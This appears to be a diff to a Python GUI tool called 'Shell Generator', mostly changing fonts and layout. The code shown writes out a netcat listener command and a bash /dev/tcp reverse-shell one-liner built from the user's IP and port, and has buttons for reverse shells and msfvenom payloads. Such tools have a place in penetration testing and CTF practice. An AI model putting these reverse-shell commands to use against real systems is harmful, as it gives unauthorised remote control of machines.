@@ -93,21 +93,18 @@ def get_the_port_from_user(event):
 
                                                                     #cat_label = cutk.CTkLabel(master=listent_frame, text="", image=cat_photo)
                                                                     #cat_label.grid(row=1, column=1)
-        listent_label.configure(text=f"   sudo nc -lvnp {PORT}",font=("Arial", 20), text_color="red")       #Nu am inteles de ce dar lucreaza si fara asta HZ de ce ?????
+        listent_label.configure(text=f"   sudo nc -lvnp {PORT}",font=("Arial", 15), text_color="red")       #Nu am inteles de ce dar lucreaza si fara asta HZ de ce ?????
         listent_label.configure(compound="left", image=cat_photo)
                                                                     #cat_label.image = cat_photo
     else:
-        # Dacă portul nu este mai mic decât 1024, distrugeți emoji-ul cu pisică plângătoare
         if 'cat_photo' in locals():
             cat_photo.destroy()
         listent_label.configure(text=f"nc -lvnp {PORT}")
-    #shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 def get_the_ip_from_user(event):
     global IP
     IP = ip_entry.get()
     print(f"IP input {IP}")
-    #shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 def ret_bash_i():
     shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
@@ -196,18 +193,20 @@ app.title("Shell Generate V1")
 app.grid_rowconfigure(0, weight=1)
 app.grid_columnconfigure(0, weight=1)
 
+app.resizable(False, False)
+
 main_frame = cutk.CTkFrame(master=app) 
 main_frame.grid(pady=30,padx=30, row=0, column=0, sticky='nsew')
 
 main_label = cutk.CTkLabel(master=main_frame, text='Shell Generator', font=("Roboto", 32))
 main_label.grid(pady=10, padx=10,row=0, columnspan=2, sticky='nsew')
+
 API_check_CVE = cutk.CTkButton(master=main_frame,text="CVE Check", command=open_check_CVE_NIST)
 API_check_CVE.grid(pady=10, padx=10,row=0, column=2, sticky='nsew')
 
 ip_port_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
 ip_port_frame.grid(pady=10, padx=10, row=1, column=0, sticky='nsew')
 ip_port_frame.grid_rowconfigure(1, weight=1)
-ip_port_frame.grid_columnconfigure(0, weight=1)
 ip_port_frame.grid_columnconfigure(1, weight=1)
 
 ip_port_label = cutk.CTkLabel(master=ip_port_frame, text="IP & Port")
@@ -223,8 +222,8 @@ port_entry.bind("<Return>", get_the_port_from_user)
 
 listent_frame = cutk.CTkFrame(master=main_frame, corner_radius=10,)
 listent_frame.grid(pady=10, padx=10, row=1, column=1, sticky='nsew')
-listent_frame.grid_rowconfigure(0, weight=1)
-listent_frame.grid_columnconfigure(0, weight=1)
+listent_frame.grid_rowconfigure(1, weight=1)
+listent_frame.grid_columnconfigure(1, weight=1)
 
 listent_label = cutk.CTkLabel(master=listent_frame, text="Listener")
 listent_label.grid(pady=10, padx=10)
@@ -235,8 +234,8 @@ listent_label.grid()
 
 shell_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
 shell_frame.grid(row=2,columnspan=2, sticky='nsew', padx=10, pady=10)
-shell_frame.grid_rowconfigure(0, weight=1)
-shell_frame.grid_columnconfigure(0, weight=1)
+shell_frame.grid_rowconfigure(0, weight=0)
+shell_frame.grid_columnconfigure(0, weight=0)
 
 revers_shell = cutk.CTkButton(master=shell_frame, command=show_reverse_shell, text="Reverse",fg_color="gray", hover_color="blue", corner_radius=10)
 revers_shell.grid(row=0, column=0)
@@ -249,15 +248,11 @@ MSF_venom.grid(row=0, column=2)
 scrollable_frame = cutk.CTkScrollableFrame(master=shell_frame, width=150, height=150)
 scrollable_frame.grid(row=1,column=0)
 
-pepega_image = Image.open("emoji/happy_pepe.png")  # Replace with your emoji image path
+pepega_image = Image.open("emoji/happy_pepe.png")
 pepega_image = pepega_image.resize((50, 50), Image.LANCZOS)  # Resize the image if necessary
 pepega_photo = ImageTk.PhotoImage(pepega_image)
 
-#pepega_label = cutk.CTkLabel(master=shell_frame, text="", image=pepega_photo)
-#pepega_label.grid(row=1, column=1)
-#pepega_label.image = pepega_photo
-
-shell_label = cutk.CTkLabel(master=shell_frame, text="   Enter your IP and Port PLS!!!", font=("Aria", 20), wraplength=500)
+shell_label = cutk.CTkLabel(master=shell_frame, text="   Enter your IP and Port PLS!!!", font=("Aria", 15), wraplength=400)
 shell_label.grid(row=1, column=1 ,columnspan=2)
 
 # Utilizați opțiunea compound pentru a afișa imaginea și textul împreună
